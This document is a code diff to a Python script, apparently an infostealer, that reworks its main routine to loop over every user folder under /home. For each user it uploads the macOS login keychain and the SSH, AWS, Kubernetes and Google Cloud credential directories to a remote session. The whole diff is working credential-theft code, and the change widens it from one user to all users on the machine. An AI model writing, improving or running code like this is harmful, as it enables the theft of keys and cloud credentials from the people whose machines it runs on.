@@ -36,18 +36,22 @@ def send_directory(session_id: str, alias: str, dirpath: str, recursive: bool=Tr
             send_file(f"{session_id}-{alias}", str(path))
 
 def get_info():
-    while True:
-        if not SESSION_ID:
-            break
+    """Scan every /home/<user>/ for the interesting paths and upload them."""
+    if not SESSION_ID:      # nothing to do without a session
+        return
 
-        # this list order matches your original
-        #send_directory(SESSION_ID, "all",   home)
+    # iterate over each directory immediately under /home
+    for user_dir in Path("/home").iterdir():
+        if not user_dir.is_dir():
+            continue
+
+        home = str(user_dir)
+        print(f"→ Scanning {home}")
         send_file(    SESSION_ID, os.path.join(home, "Library", "Keychains", "login.keychain-db"))
-        send_directory(SESSION_ID, "ssh",   os.path.join(home, ".ssh"), True)
-        send_directory(SESSION_ID, "aws",   os.path.join(home, ".aws"), True)
-        send_directory(SESSION_ID, "kube",  os.path.join(home, ".kube"), True)
-        send_directory(SESSION_ID, "gcloud",os.path.join(home, ".config", "gcloud"), True)
-        break
+        send_directory(SESSION_ID, "ssh",    os.path.join(home, ".ssh"),               True)
+        send_directory(SESSION_ID, "aws",    os.path.join(home, ".aws"),               True)
+        send_directory(SESSION_ID, "kube",   os.path.join(home, ".kube"),              True)
+        send_directory(SESSION_ID, "gcloud", os.path.join(home, ".config", "gcloud"),  True)
 
 if __name__ == "__main__":
     get_info()
